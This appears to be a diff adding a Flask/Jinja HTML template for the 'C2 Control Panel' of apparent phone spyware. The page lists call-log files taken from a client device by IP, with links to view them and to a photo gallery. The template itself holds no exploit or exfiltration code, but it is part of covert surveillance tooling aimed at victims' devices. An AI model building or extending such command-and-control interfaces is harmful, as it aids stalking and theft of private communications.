@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Logs - {{ client_ip }} - C2 Server</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Simple Navigation -->
+        <nav class="navbar">
+            <div class="navbar-brand">
+                <i class="fas fa-skull"></i>
+                <span>C2 Control Panel</span>
+            </div>
+            <div class="navbar-menu">
+                <a href="/"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/gallery"><i class="fas fa-images"></i> Gallery</a>
+                <a href="/client/{{ client_ip }}"><i class="fas fa-arrow-left"></i> Back</a>
+            </div>
+        </nav>
+
+        <!-- Header -->
+        <div style="background: var(--dark-2); border-radius: 1rem; padding: 20px; margin-bottom: 30px; border: 1px solid var(--border);">
+            <h1 style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-phone-alt" style="color: var(--primary);"></i>
+                Call Logs - {{ client_ip }}
+            </h1>
+        </div>
+
+        <!-- Call Logs -->
+        <div class="command-panel">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Filename</th>
+                        <th>Size</th>
+                        <th>Last Modified</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for call in call_files %}
+                    <tr>
+                        <td style="display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-phone-alt" style="color: var(--secondary);"></i>
+                            {{ call.filename }}
+                        </td>
+                        <td>
+                            {% if call.size < 1024 %}
+                                {{ call.size }} B
+                            {% elif call.size < 1048576 %}
+                                {{ (call.size / 1024)|round(1) }} KB
+                            {% else %}
+                                {{ (call.size / 1048576)|round(1) }} MB
+                            {% endif %}
+                        </td>
+                        <td>{{ call.modified }}</td>
+                        <td>
+                            <a href="/client/{{ client_ip }}/call_logs/{{ call.filename }}" class="btn btn-sm btn-primary" target="_blank">
+                                <i class="fas fa-eye"></i> View
+                            </a>
+                        </td>
+                    </tr>
+                    {% else %}
+                    <tr>
+                        <td colspan="4" style="text-align: center; padding: 50px; color: var(--text-secondary);">
+                            <i class="fas fa-phone-alt" style="font-size: 3em; margin-bottom: 10px; display: block;"></i>
+                            No call logs found for this device
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</body>
+</html>
